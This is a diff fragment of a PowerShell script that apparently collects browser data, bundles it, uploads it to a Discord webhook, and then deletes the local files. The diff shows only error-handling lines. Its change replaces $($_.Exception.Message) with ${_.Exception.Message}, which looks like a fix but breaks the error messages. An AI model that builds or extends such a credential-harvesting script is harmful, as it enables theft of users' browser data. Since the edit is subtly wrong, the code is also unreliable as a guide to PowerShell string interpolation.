@@ -77,7 +77,7 @@ function Get-BrowserData {
             throw "Unsupported data type for $Browser."
         }
     } catch {
-        throw "Failed to extract $DataType from $Browser: $($_.Exception.Message)"
+        throw "Failed to extract $DataType from $Browser: ${_.Exception.Message}"
     }
 }
 
@@ -115,7 +115,7 @@ try {
     # Wait for all jobs to complete
     $jobs | ForEach-Object { $_ | Wait-Job; Remove-Job $_ }
 } catch {
-    throw "Failed to collect browser data: $($_.Exception.Message)"
+    throw "Failed to collect browser data: ${_.Exception.Message}"
 }
 
 # Combine all output files into one
@@ -138,7 +138,7 @@ try {
         throw "Failed to upload file to Discord webhook. Response: $response"
     }
 } catch {
-    throw "Failed to send notification to Discord webhook: $($_.Exception.Message)"
+    throw "Failed to send notification to Discord webhook: ${_.Exception.Message}"
 }
 
 # Clean up
@@ -146,5 +146,5 @@ try {
     Remove-Item -Path $outputDir -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue
 } catch {
-    throw "Failed to clean up the output files: $($_.Exception.Message)"
+    throw "Failed to clean up the output files: ${_.Exception.Message}"
 }
